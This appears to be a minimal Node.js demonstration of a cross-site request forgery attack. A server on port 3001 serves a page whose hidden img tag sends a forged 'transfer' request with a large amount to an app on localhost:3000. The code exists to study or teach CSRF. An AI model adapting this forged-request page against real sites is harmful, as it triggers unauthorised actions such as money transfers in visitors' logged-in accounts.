const http = require('http');
http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type':'text/html'})
    res.write(`
        <img src="http://localhost:3000/transfer?name=bad&money=10000000">
    `)
    res.end()
}).listen(3001)
